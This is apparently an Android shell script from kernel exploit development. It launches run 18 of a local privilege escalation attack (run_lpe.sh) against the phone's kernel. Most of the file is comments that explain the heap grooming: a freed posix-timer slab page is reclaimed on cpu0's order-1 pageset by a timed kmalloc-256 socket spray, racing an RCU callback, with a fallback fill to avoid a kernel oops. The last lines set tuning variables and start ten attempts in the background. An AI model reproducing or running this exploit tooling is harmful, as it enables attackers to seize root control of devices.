#!/system/bin/sh
# run18: run16/17 geometry, but the spray is already running when X's page
# is freed (no IC_EARLY_WAIT, no page-set gate).
#
# Where run17's captures went wrong:
#  - release_posix_timer() frees the k_itimer through call_rcu(), so the
#    slab discard runs from the RCU callback ~26-48 ms after the flush
#    delete.  A standalone probe (pcpwho) showed those callbacks run on the
#    CPU that issued timer_delete() -- the delete CPU's pageset count jumps
#    by 2 per discarded slab and, when it is near the high mark, the whole
#    pageset drains to 0.  So X lands at the head of cpu0's order-1
#    Unmovable list, exactly where the spray wants it.
#  - A second probe (pcp2) showed an order-1 Unmovable *slab* allocation on
#    cpu0 does reclaim those pages (2048 file opens -> filp, 320 B / 25 per
#    order-1 slab, pulled ~164 pages out of the pageset).  So the list is
#    the right one; the page only gets away if something else allocates an
#    order-1 slab first.
#  - IC_EARLY_WAIT made the attempt wait for the drop to appear in
#    /proc/slabinfo and then spent the next instant in the IC_EARLY_GATE,
#    which fopen()ed /proc/zoneinfo: a struct file (filp, order-1 slab) and
#    a dentry (order-1 slab) allocated while X sat at the pageset head.
#    That is a thief in the one-millisecond window that decides the whole
#    attempt, and it explains why the same geometry captured 6/8 in run16
#    and 1/5 in run17.  The gate is now gone from the run and the counter
#    read is a pread() on a pre-opened fd (no allocation at all).
#
# The spray (38464 kmalloc-256 psl objects, 1202 fresh order-1 slabs) now
# starts the moment the flush delete returns and is still allocating fresh
# slabs when the RCU callback lands, so the very next slab allocation takes
# X's page.  The 4000-timer safe fill still runs after the spray as the
# fallback that turns a lost page into a zeroed posix timer instead of an
# oops.
#
# Reboot before running: run17's panic rebooted the phone, and any parked
# attempt keeps its psl sockets until reboot.
cd /data/local/tmp || exit 1
rm -f ic-run18.log
IC_SLABTRACE=1 IC_PAD_ALIGN=1 IC_SPRAY_EARLY=1 \
IC_EARLY_PRIME=1024 IC_SKB_SOCKS=8 \
IC_PAD_KEEP=4185 IC_FLUSH_SPARSE=15 IC_ATTEMPT_WAIT=150 \
  ATTEMPTS=10 nohup sh /data/local/tmp/run_lpe.sh > /data/local/tmp/ic-run18.log 2>&1 &
exit 0
